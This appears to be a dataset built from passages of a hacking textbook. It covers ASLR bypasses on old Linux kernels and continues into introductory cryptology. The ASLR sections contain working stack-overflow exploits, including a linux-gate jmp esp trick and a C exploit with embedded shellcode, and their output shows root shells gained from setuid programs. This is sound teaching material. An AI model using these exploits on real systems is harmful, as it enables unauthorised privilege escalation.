    "output": "Despite the randomization between runs, notice how similar the address\nin ESP is to the address of the buffer (shown in bold). This makes sense, since\nthe stack pointer points to the stack and the buffer is on the stack. ESP’s value\nand the buffer’s address are changed by the same random value, because\nthey are relative to each other.\nGDB’s stepi command steps the program forward in execution by a single\ninstruction. Using this, we can check ESP’s value after the ret instruction has\nexecuted.\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/aslr_demo\nbuffer is at 0xbfd1ccb0\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12 }\n(gdb) i r esp\nesp 0xbfd1ccfc 0xbfd1ccfc\n(gdb) stepi\n0xb7e4debc in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6\n(gdb) i r esp\nesp 0xbfd1cd00 0xbfd1cd00\n(gdb) x/24x 0xbfd1ccb0\n0xbfd1ccb0: 0x00000000 0x080495cc 0xbfd1ccc8 0x08048291\n0xbfd1ccc0: 0xb7f3d729 0xb7f74ff4 0xbfd1ccf8 0x08048429\n0xbfd1ccd0: 0xb7f74ff4 0xbfd1cd8c 0xbfd1ccf8 0xb7f74ff4\n0xbfd1cce0: 0xb7f937b0 0x08048410 0x00000000 0xb7f74ff4\n0xbfd1ccf0: 0xb7f9fce0 0x08048410 0xbfd1cd58 0xb7e4debc\n0xbfd1cd00: 0x00000001 0xbfd1cd84 0xbfd1cd8c 0xb7fa0898\n(gdb) p 0xbfd1cd00 - 0xbfd1ccb0\n$1 = 80\n(gdb) p 80/4\n$2 = 20\n(gdb)\nSingle stepping shows that the ret instruction increases the value of ESP by\n4. Subtracting the value of ESP from the address of the buffer, we find that ESP\nis pointing 80 bytes (or 20 words) from the start of the buffer. Since the return\naddress’s offset was 19 words, this means that after main’s final ret instruction,\nESP points to stack memory found directly after the return address. This would\nbe useful if there was a way to control EIP to go where ESP is pointing instead.\n0x6c2 Bouncing Off linux-gate\nThe technique described below doesn’t work with Linux kernels starting\nfrom 2.6.18. This technique gained some popularity and, of course, the\ndevelopers patched the problem. The kernel used in the included LiveCD\nis2.6.20, so the output below is from the machine loki, which is running a\n2.6.17 Linux kernel. Even though this particular technique doesn’t work on\nthe LiveCD, the concepts behind it can be applied in other useful ways.\n384 0x600\nBouncing off linux-gate refers to a shared object, exposed by the kernel,\nwhich looks like a shared library. The program ldd shows a program’s\nshared library dependencies. Do you notice anything interesting about\nthelinux-gate library in the output below?\nmatrix@loki /hacking $ $ uname -a\nLinux hacking 2.6.17 #2 SMP Sun Apr 11 03:42:05 UTC 2007 i686 GNU/Linux\nmatrix@loki /hacking $ cat /proc/sys/kernel/randomize_va_space\n1\nmatrix@loki /hacking $ ldd ./aslr_demo\nlinux-gate.so.1 => (0xffffe000)\nlibc.so.6 => /lib/libc.so.6 (0xb7eb2000)\n/lib/ld-linux.so.2 (0xb7fe5000)\nmatrix@loki /hacking $ ldd /bin/ls\nlinux-gate.so.1 => (0xffffe000)\nlibrt.so.1 => /lib/librt.so.1 (0xb7f95000)\nlibc.so.6 => /lib/libc.so.6 (0xb7e75000)\nlibpthread.so.0 => /lib/libpthread.so.0 (0xb7e62000)\n/lib/ld-linux.so.2 (0xb7fb1000)\nmatrix@loki /hacking $ ldd /bin/ls\nlinux-gate.so.1 => (0xffffe000)\nlibrt.so.1 => /lib/librt.so.1 (0xb7f50000)\nlibc.so.6 => /lib/libc.so.6 (0xb7e30000)\nlibpthread.so.0 => /lib/libpthread.so.0 (0xb7e1d000)\n/lib/ld-linux.so.2 (0xb7f6c000)\nmatrix@loki /hacking $\nEven in different programs and with ASLR enabled, linux-gate.so.1 is\nalways present at the same address. This is a virtual dynamically shared object\nused by the kernel to speed up system calls, which means it’s needed in\nevery process. It is loaded straight from the kernel and doesn’t exist anywhere\non disk.\nThe important thing is that every process has a block of memory contain-\ning linux-gate’s instructions, which are always at the same location, even\nwith ASLR. We are going to search this memory space for a certain assembly\ninstruction, jmp esp. This instruction will jump EIP to where ESP is pointing.\nFirst, we assemble the instruction to see what it looks like in machine code.\nmatrix@loki /hacking $ cat > jmpesp.s\nBITS 32\njmp esp\nmatrix@loki /hacking $ nasm jmpesp.s\nmatrix@loki /hacking $ hexdump -C jmpesp\n00000000 ff e4 |..|\n00000002\nmatrix@loki /hacking $\nUsing this information, a simple program can be written to find this\npattern in the program’s own memory.\nCountermeasures 385\nfind_jmpesp.c\nint main()\n{\nunsigned long linuxgate_start = 0xffffe000;\nchar *ptr = (char *) linuxgate_start;\nint i;\nfor(i=0; i < 4096; i++)\n{\nif(ptr[i] == '\\xff' && ptr[i+1] == '\\xe4')\nprintf(\"found jmp esp at %p\\n\", ptr+i);\n}\n}\nWhen the program is compiled and run, it shows that this instruction\nexists at 0xffffe777. This can be further verified using GDB:\nmatrix@loki /hacking $ ./find_jmpesp\nfound jmp esp at 0xffffe777\nmatrix@loki /hacking $ gdb -q ./aslr_demo\nUsing host libthread_db library \"/lib/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x80483f0: file aslr_demo.c, line 7.\n(gdb) run\nStarting program: /hacking/aslr_demo\nBreakpoint 1, main (argc=1, argv=0xbf869894) at aslr_demo.c:7\n7 printf(\"buffer is at %p\\n\", &buffer);\n(gdb) x/i 0xffffe777\n0xffffe777: jmp esp\n(gdb)\nPutting it all together, if we overwrite the return address with the address\n0xffffe777, then execution will jump into linux-gate when the main function\nreturns. Since this is a jmp esp instruction, execution will immediately jump\nback out of linux-gate to wherever ESP happens to be pointing. From our\nprevious debugging, we know that at the end of the main function, ESP is\npointing to memory directly after the return address. So if shellcode is put\nhere, EIP should bounce right into it.\nmatrix@loki /hacking $ sudo chown root:root ./aslr_demo\nmatrix@loki /hacking $ sudo chmod u+s ./aslr_demo\nmatrix@loki /hacking $ ./aslr_demo $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x20')$(cat scode.bin)\nbuffer is at 0xbf8d9ae0\nsh-3.1#\nThis technique can also be used to exploit the notesearch program, as\nshown here.\n386 0x600\nmatrix@loki /hacking $ for i in `seq 1 50`; do ./notesearch $(perl -e \"print 'AAAA'x$i\"); if [\n$? == 139 ]; then echo \"Try $i words\"; break; fi; done\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\n*** OUTPUT TRIMMED ***\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\nSegmentation fault\nTry 35 words\nmatrix@loki /hacking $ ./notesearch $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x35')$(cat scode.bin)\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\nSegmentation fault\nmatrix@loki /hacking $ ./notesearch $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x36')$(cat scode2.bin)\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\nsh-3.1#\nThe initial estimate of 35 words was off, since the program still crashed\nwith the slightly smaller exploit buffer. But it is in the right ballpark, so a\nmanual tweak (or a more accurate way to calculate the offset) is all that is\nneeded.\nSure, bouncing off linux-gate is a slick trick, but it only works with older\nLinux kernels. Back on the LiveCD, running Linux 2.6.20, the useful instruc-\ntion is no longer found in the usual address space.\nreader@hacking:~/booksrc $ uname -a\nLinux hacking 2.6.20-15-generic #2 SMP Sun Apr 15 07:36:31 UTC 2007 i686 GNU/Linux\nreader@hacking:~/booksrc $ gcc -o find_jmpesp find_jmpesp.c\nreader@hacking:~/booksrc $ ./find_jmpesp\nreader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbfcf3480\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbfd39cd0\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfc8d9c3\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfa0c9c3\nreader@hacking:~/booksrc $\nCountermeasures 387"
  },
  {
    "input": "0x6c4 A First Attempt",
    "output": "Without the jmp esp instruction at a predictable address, there is no\neasy way to bounce off of linux-gate. Can you think of a way to bypass ASLR\nto exploit aslr_demo on the LiveCD?\n0x6c3 Applied Knowledge\nSituations like this are what makes hacking an art. The state of computer\nsecurity is a constantly changing landscape, and specific vulnerabilities are\ndiscovered and patched every day. However, if you understand the concepts\nof the core hacking techniques explained in this book, you can apply them in\nnew and inventive ways to solve the problem du jour. Like LEGO bricks,\nthese techniques can be used in millions of different combinations and\nconfigurations. As with any art, the more you practice these techniques, the\nbetter you’ll understand them. With this understanding comes the wisdom to\nguesstimate offsets and recognize memory segments by their address ranges.\nIn this case, the problem is still ASLR. Hopefully, you have a few bypass\nideas you might want to try out now. Don’t be afraid to use the debugger to\nexamine what is actually happening. There are probably several ways to bypass\nASLR, and you may invent a new technique. If you don’t find a solution, don’t\nworry—I’ll explain a method in the next section. But it’s worthwhile to think\nabout this problem a little on your own before reading ahead.\n0x6c4 A First Attempt\nIn fact, I had written this chapter before linux-gate was fixed in the Linux\nkernel, so I had to hack together an ASLR bypass. My first thought was to\nleverage the execl() family of functions. We’ve been using the execve()\nfunction in our shellcode to spawn a shell, and if you pay close attention\n(or just read the man page), you’ll notice the execve() function replaces the\ncurrently running process with the new process image.\nEXEC(3) Linux Programmer's Manual\nNAME\nexecl, execlp, execle, execv, execvp - execute a file\nSYNOPSIS\n#include <unistd.h>\nextern char **environ;\nint execl(const char *path, const char *arg, ...);\nint execlp(const char *file, const char *arg, ...);\nint execle(const char *path, const char *arg,\n..., char * const envp[]);\nint execv(const char *path, char *const argv[]);\nint execvp(const char *file, char *const argv[]);\nDESCRIPTION\nThe exec() family of functions replaces the current process\nimage with a new process image. The functions described in this\nmanual page are front-ends for the function execve(2). (See the\n388 0x600\nmanual page for execve() for detailed information about the\nreplacement of the current process.)\nIt seems like there could be a weakness here if the memory layout is\nrandomized only when the process is started. Let’s test this hypothesis with a\npiece of code that prints the address of a stack variable and then executes\naslr_demo using an execl() function.\naslr_execl.c\n#include <stdio.h>\n#include <unistd.h>\nint main(int argc, char *argv[]) {\nint stack_var;\n// Print an address from the current stack frame.\nprintf(\"stack_var is at %p\\n\", &stack_var);\n// Start aslr_demo to see how its stack is arranged.\nexecl(\"./aslr_demo\", \"aslr_demo\", NULL);\n}\nWhen this program is compiled and executed, it will execl() aslr_demo,\nwhich also prints the address of a stack variable (buffer). This lets us compare\nthe memory layouts.\nreader@hacking:~/booksrc $ gcc -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ gcc -o aslr_execl aslr_execl.c\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbf9f31c0\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbffaaf70\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbf832044\nbuffer is at 0xbf832000\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbf832044 - 0xbf832000\"\n$1 = 68\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbfa97844\nbuffer is at 0xbf82f800\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfa97844 - 0xbf82f800\"\n$1 = 2523204\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbfbb0bc4\nbuffer is at 0xbff3e710\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfbb0bc4 - 0xbff3e710\"\n$1 = 4291241140\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbf9a81b4\nbuffer is at 0xbf9a8180\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbf9a81b4 - 0xbf9a8180\"\n$1 = 52\nreader@hacking:~/booksrc $\nCountermeasures 389"
  },
  {
    "input": "0x6c5 Playing the Odds",
    "output": "The first result looks very promising, but further attempts show that\nthere is some degree of randomization happening when the new process is\nexecuted with execl(). I’m sure this wasn’t always the case, but the progress\nofopen source is rather constant. This isn’t much of a problem though, since\nwe have ways to deal with that partial uncertainty.\n0x6c5 Playing the Odds\nUsing execl() at least limits the randomness and gives us a ballpark address\nrange. The remaining uncertainty can be handled with a NOP sled. A quick\nexamination of aslr_demo shows that the overflow buffer needs to be 80 bytes\nto overwrite the stored return address on the stack.\nreader@hacking:~/booksrc $ gdb -q ./aslr_demo\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) run $(perl -e 'print \"AAAA\"x19 . \"BBBB\"')\nStarting program: /home/reader/booksrc/aslr_demo $(perl -e 'print \"AAAA\"x19 . \"BBBB\"')\nbuffer is at 0xbfc7d3b0\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n(gdb) p 20*4\n$1 = 80\n(gdb) quit\nThe program is running. Exit anyway? (y or n) y\nreader@hacking:~/booksrc $\nSince we will probably want a rather large NOP sled, in the following\nexploit the NOP sled and the shellcode will be put after the return address\noverwrite. This allows us to inject as much of a NOP sled as needed. In this\ncase, a thousand bytes or so should be sufficient.\naslr_execl_exploit.c\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\"; // Standard shellcode\nint main(int argc, char *argv[]) {\nunsigned int i, ret, offset;\nchar buffer[1000];\nprintf(\"i is at %p\\n\", &i);\nif(argc > 1) // Set offset.\noffset = atoi(argv[1]);\nret = (unsigned int) &i - offset + 200; // Set return address.\nprintf(\"ret addr is %p\\n\", ret);\n390 0x600\nfor(i=0; i < 90; i+=4) // Fill buffer with return address.\n*((unsigned int *)(buffer+i)) = ret;\nmemset(buffer+84, 0x90, 900); // Build NOP sled.\nmemcpy(buffer+900, shellcode, sizeof(shellcode));\nexecl(\"./aslr_demo\", \"aslr_demo\", buffer, NULL);\n}\nThis code should make sense to you. The value 200 is added to the return\naddress to skip over the first 90 bytes used for the overwrite, so execution lands\nsomewhere in the NOP sled.\nreader@hacking:~/booksrc $ sudo chown root ./aslr_demo\nreader@hacking:~/booksrc $ sudo chmod u+s ./aslr_demo\nreader@hacking:~/booksrc $ gcc aslr_execl_exploit.c\nreader@hacking:~/booksrc $ ./a.out\ni is at 0xbfa3f26c\nret addr is 0xb79f6de4\nbuffer is at 0xbfa3ee80\nSegmentation fault\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfa3f26c - 0xbfa3ee80\"\n$1 = 1004\nreader@hacking:~/booksrc $ ./a.out 1004\ni is at 0xbfe9b6cc\nret addr is 0xbfe9b3a8\nbuffer is at 0xbfe9b2e0\nsh-3.2# exit\nexit\nreader@hacking:~/booksrc $ ./a.out 1004\ni is at 0xbfb5a38c\nret addr is 0xbfb5a068\nbuffer is at 0xbfb20760\nSegmentation fault\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfb5a38c - 0xbfb20760\"\n$1 = 236588\nreader@hacking:~/booksrc $ ./a.out 1004\ni is at 0xbfce050c\nret addr is 0xbfce01e8\nbuffer is at 0xbfce0130\nsh-3.2# whoami\nroot\nsh-3.2#\nAs you can see, occasionally the randomization causes the exploit to fail,\nbut it only needs to succeed once. This leverages the fact that we can try the\nexploit as many times as we want. The same technique will work with the note-\nsearch exploit while ASLR is running. Try writing an exploit to do this.\nOnce the basic concepts of exploiting programs are understood, countless\nvariations are possible with a little bit of creativity. Since the rules of a program\nare defined by its creators, exploiting a supposedly secure program is simply a\nmatter of beating them at their own game. New clever methods, such as stack\nguards and IDSs, try to compensate for these problems, but these solutions\naren’t perfect either. A hacker’s ingenuity tends to find holes in these systems.\nJust think of the things they didn’t think of.\nCountermeasures 391"
  },
  {
    "input": "0x700: Cryptology",
    "output": "0x700\nC R Y P T O L O G Y\nCryptology is defined as the study of cryptography or\ncryptanalysis. Cryptography is simply the process of com-\nmunicating secretly through the use of ciphers, and\ncryptanalysis is the process of cracking or deciphering\nsuch secret communications. Historically, cryptology has been of particular\ninterest during wars, when countries used secret codes to communicate with\ntheir troops while also trying to break the enemy’s codes to infiltrate their\ncommunications.\nThe wartime applications still exist, but the use of cryptography in\ncivilian life is becoming increasingly popular as more critical transactions\noccur over the Internet. Network sniffing is so common that the paranoid\nassumption that someone is always sniffing network traffic might not be so\nparanoid. Passwords, credit card numbers, and other proprietary information\ncan all be sniffed and stolen over unencrypted protocols. Encrypted com-\nmunication protocols provide a solution to this lack of privacy and allow\nthe Internet economy to function. Without Secure Sockets Layer (SSL)"
  },
  {
    "input": "0x711 Unconditional Security",
    "output": "encryption, credit card transactions at popular websites would be either\nveryinconvenient or insecure.\nAll of this private data is protected by cryptographic algorithms that are\nprobably secure. Currently, cryptosystems that can be proven to be secure\nare far too unwieldy for practical use. So in lieu of a mathematical proof of\nsecurity, cryptosystems that are practically secure are used. This means that it’s\npossible that shortcuts for defeating these ciphers exist, but no one’s been\nable to actualize them yet. Of course, there are also cryptosystems that aren’t\nsecure at all. This could be due to the implementation, key size, or simply\ncryptanalytic weaknesses in the cipher itself. In 1997, under US law, the\nmaximum allowable key size for encryption in exported software was 40 bits.\nThis limit on key size makes the corresponding cipher insecure, as was shown\nby RSA Data Security and Ian Goldberg, a graduate student from the Uni-\nversity of California, Berkeley. RSA posted a challenge to decipher a message\nencrypted with a 40-bit key, and three and a half hours later, Ian had done\njust that. This was strong evidence that 40-bit keys aren’t large enough for a\nsecure cryptosystem.\nCryptology is relevant to hacking in a number of ways. At the purest\nlevel, the challenge of solving a puzzle is enticing to the curious. At a more\nnefarious level, the secret data protected by that puzzle is perhaps even more\nalluring. Breaking or circumventing the cryptographic protections of secret\ndata can provide a certain sense of satisfaction, not to mention a sense of\ntheprotected data’s contents. In addition, strong cryptography is useful in\navoiding detection. Expensive network intrusion detection systems designed\nto sniff network traffic for attack signatures are useless if the attacker is using\nan encrypted communication channel. Often, the encrypted Web access\nprovided for customer security is used by attackers as a difficult-to-monitor\nattack vector.\n0x710 Information Theory\nMany of the concepts of cryptographic security stem from the mind of\nClaude Shannon. His ideas have influenced the field of cryptography greatly,\nespecially the concepts of diffusion and confusion. Although the following\nconcepts of unconditional security, one-time pads, quantum key distribution,\nand computational security weren’t actually conceived by Shannon, his ideas\non perfect secrecy and information theory had great influence on the\ndefinitions of security.\n0x711 Unconditional Security\nA cryptographic system is considered to be unconditionally secure if it\ncannot be broken, even with infinite computational resources. This implies\nthat cryptanalysis is impossible and that even if every possible key were tried\nin an exhaustive brute-force attack, it would be impossible to determine\nwhich key was the correct one.\n394 0x700"
  },
  {
    "input": "0x713 Quantum Key Distribution",
    "output": "0x712 One-Time Pads\nOne example of an unconditionally secure cryptosystem is the one-time pad.\nAone-time pad is a very simple cryptosystem that uses blocks of random data\ncalled pads. The pad must be at least as long as the plaintext message that is\nto be encoded, and the random data on the pad must be truly random, in\nthe most literal sense of the word. Two identical pads are made: one for the\nrecipient and one for the sender. To encode a message, the sender simply\nXORs each bit of the plaintext message with the corresponding bit of the\npad. After the message is encoded, the pad is destroyed to ensure that it is\nonly used once. Then the encrypted message can be sent to the recipient with-\nout fear of cryptanalysis, since the encrypted message cannot be broken\nwithout the pad. When the recipient receives the encrypted message, he also\nXORs each bit of the encrypted message with the corresponding bit of his\npad to produce the original plaintext message.\nWhile the one-time pad is theoretically impossible to break, in reality it’s\nnot really all that practical to use. The security of the one-time pad hinges\nonthe security of the pads. When the pads are distributed to the recipient\nand the sender, it is assumed that the pad transmission channel is secure.\nTobe truly secure, this could involve a face-to-face meeting and exchange,\nbut for convenience, the pad transmission may be facilitated via yet another\ncipher. The price of this convenience is that the entire system is now only\nas strong as the weakest link, which would be the cipher used to transmit\nthe pads. Since the pad consists of random data of the same length as the\nplaintext message, and since the security of the whole system is only as\ngood as the security of pad transmission, it usually makes more sense to just\nsend the plaintext message encoded using the same cipher that would have\nbeen used to transmit the pad.\n0x713 Quantum Key Distribution\nThe advent of quantum computation brings many interesting things to the\nfield of cryptology. One of these is a practical implementation of the one-\ntime pad, made possible by quantum key distribution. The mystery of quantum\nentanglement can provide a reliable and secret method of sending a random\nstring of bits that can be used as a key. This is done using nonorthogonal\nquantum states in photons.\nWithout going into too much detail, the polarization of a photon is the\noscillation direction of its electric field, which in this case can be along the\nhorizontal, vertical, or one of the two diagonals. Nonorthogonal simply means\nthe states are separated by an angle that isn’t 90 degrees. Curiously enough,\nit’s impossible to determine with certainty which of these four polarizations a\nsingle photon has. The rectilinear basis of the horizontal and vertical polariza-\ntions is incompatible with the diagonal basis of the two diagonal polarizations,\nso, due to the Heisenberg uncertainty principle, these two sets of polarizations\ncannot both be measured. Filters can be used to measure the polarizations—\none for the rectilinear basis and one for the diagonal basis. When a photon\npasses through the correct filter, its polarization won’t change, but if it passes\nCryptology 395"
  },
  {
    "input": "0x714 Computational Security",
    "output": "through the incorrect filter, its polarization will be randomly modified. This\nmeans that any eavesdropping attempt to measure the polarization of a\nphoton has a good chance of scrambling the data, making it apparent that\nthe channel isn’t secure.\nThese strange aspects of quantum mechanics were put to good use by\nCharles Bennett and Gilles Brassard in the first and probably best-known\nquantum key distribution scheme, called BB84. First, the sender and receiver\nagree on bit representation for the four polarizations, such that each basis\nhas both 1 and 0. In this scheme, 1 could be represented by both vertical\nphoton polarization and one of the diagonal polarizations (positive\n45degrees), while 0 could be represented by horizontal polarization and\nthe other diagonal polarization (negative 45 degrees). This way, 1s and\n0scan exist when the rectilinear polarization is measured and when the\ndiagonal polarization is measured.\nThen, the sender sends a stream of random photons, each coming from\na randomly chosen basis (either rectilinear or diagonal), and these photons\nare recorded. When the receiver receives a photon, he also randomly chooses\nto measure it in either the rectilinear basis or the diagonal basis and records\nthe result. Now, the two parties publicly compare which basis they used for\neach photon, and they keep only the data corresponding to the photons they\nboth measured using the same basis. This doesn’t reveal the bit values of the\nphotons, since there are both 1s and 0s in each basis. This makes up the key\nfor the one-time pad.\nSince an eavesdropper would ultimately end up changing the polarization\nof some of these photons and thus scramble the data, eavesdropping can be\ndetected by computing the error rate of some random subset of the key. If\nthere are too many errors, someone was probably eavesdropping, and the\nkey should be thrown away. If not, the transmission of the key data was secure\nand private.\n0x714 Computational Security\nA cryptosystem is considered to be computationally secure if the best-known\nalgorithm for breaking it requires an unreasonable amount of computational\nresources and time. This means that it is theoretically possible for an eaves-\ndropper to break the encryption, but it is practically infeasible to actually do\nso, since the amount of time and resources necessary would far exceed the\nvalue of the encrypted information. Usually, the time needed to break a\ncomputationally secure cryptosystem is measured in tens of thousands of\nyears, even with the assumption of a vast array of computational resources.\nMost modern cryptosystems fall into this category.\nIt’s important to note that the best-known algorithms for breaking crypto-\nsystems are always evolving and being improved. Ideally, a cryptosystem\nwould be defined as computationally secure if the best algorithm for breaking\nitrequires an unreasonable amount of computational resources and time,\nbut there is currently no way to prove that a given encryption-breaking algo-\nrithm is and always will be the best one. So, the current best-known algorithm\nis used instead to measure a cryptosystem’s security.\n396 0x700"
  },
  {
    "input": "0x720 Algorithmic Run Time",
    "output": "0x720 Algorithmic Run Time\nAlgorithmic run time is a bit different from the run time of a program. Since\nan algorithm is simply an idea, there’s no limit to the processing speed for\nevaluating the algorithm. This means that an expression of algorithmic run\ntime in minutes or seconds is meaningless.\nWithout factors such as processor speed and architecture, the important\nunknown for an algorithm is input size. A sorting algorithm running on 1,000\nelements will certainly take longer than the same sorting algorithm running\non 10 elements. The input size is generally denoted by n, and each atomic\nstep can be expressed as a number. The run time of a simple algorithm, such\nas the one that follows, can be expressed in terms of n.\nfor(i = 1 to n) {\nDo something;\nDo another thing;\n}\nDo one last thing;\nThis algorithm loops n times, each time doing two actions, and then\ndoes one last action, so the time complexity for this algorithm would be 2n + 1.\nA more complex algorithm with an additional nested loop tacked on, shown\nbelow, would have a time complexity of n2 + 2n + 1, since the new action is\nexecuted n2 times.\nfor(x = 1 to n) {\nfor(y = 1 to n) {\nDo the new action;\n}\n}\nfor(i = 1 to n) {\nDo something;\nDo another thing;\n}\nDo one last thing;\nBut this level of detail for time complexity is still too granular. For\nexample, as n becomes larger, the relative difference between 2n + 5 and\n2n + 365 becomes less and less. However, as n becomes larger, the relative\ndifference between 2n2 + 5 and 2n + 5 becomes larger and larger. This type\nof generalized trending is what is most important to the run time of an\nalgorithm.\nConsider two algorithms, one with a time complexity of 2n + 365 and\nthe other with 2n2 + 5. The 2n2 + 5 algorithm will outperform the 2n + 365\nalgorithm on small values for n. But for n = 30, both algorithms perform\nequally, and for all n greater than 30, the 2n + 365 algorithm will outperform\nthe 2n2 + 5 algorithm. Since there are only 30 values for n in which the\n2n2+ 5 algorithm performs better, but an infinite number of values for n\ninwhich the 2n + 365 algorithm performs better, the 2n + 365 algorithm is\ngenerally more efficient.\nCryptology 397"
  },
  {
    "input": "0x730 Symmetric Encryption",
    "output": "This means that, in general, the growth rate of the time complexity of\nanalgorithm with respect to input size is more important than the time com-\nplexity for any fixed input. While this might not always hold true for specific\nreal-world applications, this type of measurement of an algorithm’s efficiency\ntends to be true when averaged over all possible applications.\n0x721 Asymptotic Notation\nAsymptotic notation is a way to express an algorithm’s efficiency. It’s called\nasymptotic because it deals with the behavior of the algorithm as the input\nsize approaches the asymptotic limit of infinity.\nReturning to the examples of the 2n + 365 algorithm and the 2n2 + 5\nalgorithm, we determined that the 2n + 365 algorithm is generally more\nefficient because it follows the trend of n, while the 2n2 + 5 algorithm\nfollows the general trend of n2. This means that 2n + 365 is bounded above\nby a positive multiple of n for all sufficiently large n, and 2n2 + 5 is bounded\nabove by a positive multiple of n2 for all sufficiently large n.\nThis sounds kind of confusing, but all it really means is that there exists a\npositive constant for the trend value and a lower bound on n, such that the\ntrend value multiplied by the constant will always be greater than the time\ncomplexity for all n greater than the lower bound. In other words, 2n2 + 5 is\nin the order of n2, and 2n + 365 is in the order of n. There’s a convenient\nmathematical notation for this, called big-oh notation, which looks like O(n2)\nto describe an algorithm that is in the order of n2.\nA simple way to convert an algorithm’s time complexity to big-oh notation\nis to simply look at the high-order terms, since these will be the terms that\nmatter most as n becomes sufficiently large. So an algorithm with a time\ncomplexity of 3n4 + 43n3 + 763n + log n + 37 would be in the order of O(n4),\nand 54n7 + 23n4 + 4325 would be O(n7).\n0x730 Symmetric Encryption\nSymmetric ciphers are cryptosystems that use the same key to encrypt and\ndecrypt messages. The encryption and decryption process is generally faster\nthan with asymmetric encryption, but key distribution can be difficult.\nThese ciphers are generally either block ciphers or stream ciphers.\nAblock cipher operates on blocks of a fixed size, usually 64 or 128 bits. The\nsame block of plaintext will always encrypt to the same ciphertext block,\nusing the same key. DES, Blowfish, and AES (Rijndael) are all block ciphers.\nStream ciphers generate a stream of pseudo-random bits, usually either one\nbit or byte at a time. This is called the keystream, and it is XORed with the\nplaintext. This is useful for encrypting continuous streams of data. RC4 and\nLSFR are examples of popular stream ciphers. RC4 will be discussed in depth\nin “Wireless 802.11b Encryption” on page 433.\nDES and AES are both popular block ciphers. A lot of thought goes into\nthe construction of block ciphers to make them resistant to known crypt-\nanalytical attacks. Two concepts used repeatedly in block ciphers are confusion\n398 0x700"
  },
  {
    "input": "0x731 Lov Grover’s Quantum Search Algorithm",
    "output": "and diffusion. Confusion refers to methods used to hide relationships between\nthe plaintext, the ciphertext, and the key. This means that the output bits\nmust involve some complex transformation of the key and plaintext. Diffusion\nserves to spread the influence of the plaintext bits and the key bits over as\nmuch of the ciphertext as possible. Product ciphers combine both of these\nconcepts by using various simple operations repeatedly. Both DES and AES\nare product ciphers.\nDES also uses a Feistel network. It is used in many block ciphers to\nensure that the algorithm is invertible. Basically, each block is divided into\ntwo halves, left (L) and right (R). Then, in one round of operation, the new\nleft half (L) is set to be equal to the old right half (R ), and the new right\ni i−1\nhalf (R) is made up of the old left half (L ) XORed with the output of a\ni i−1\nfunction using the old right half (R ) and the subkey for that round (K).\ni−1 i\nUsually, each round of operation has a separate subkey, which is calculated\nearlier.\nThe values for L and R are as follows (the ⊕ symbol denotes the XOR\ni i\noperation):\nL = R\ni i−1\nR = L ⊕ f(R , K)\ni i−1 i−1 i\nDES uses 16 rounds of operation. This number was specifically chosen to\ndefend against differential cryptanalysis. DES’s only real known weakness is\nits key size. Since the key is only 56 bits, the entire keyspace can be checked\nin an exhaustive brute-force attack in a few weeks on specialized hardware.\nTriple-DES fixes this problem by using two DES keys concatenated\ntogether for a total key size of 112 bits. Encryption is done by encrypting the\nplaintext block with the first key, then decrypting with the second key, and\nthen encrypting again with the first key. Decryption is done analogously, but\nwith the encryption and decryption operations switched. The added key size\nmakes a brute-force effort exponentially more difficult.\nMost industry-standard block ciphers are resistant to all known forms of\ncryptanalysis, and the key sizes are usually too big to attempt an exhaustive\nbrute-force attack. However, quantum computation provides some interesting\npossibilities, which are generally overhyped.\n0x731 Lov Grover’s Quantum Search Algorithm\nQuantum computation gives the promise of massive parallelism. A quantum\ncomputer can store many different states in a superposition (which can be\nthought of as an array) and perform calculations on all of them at once.\nThis is ideal for brute forcing anything, including block ciphers. The super-\nposition can be loaded up with every possible key, and then the encryption\noperation can be performed on 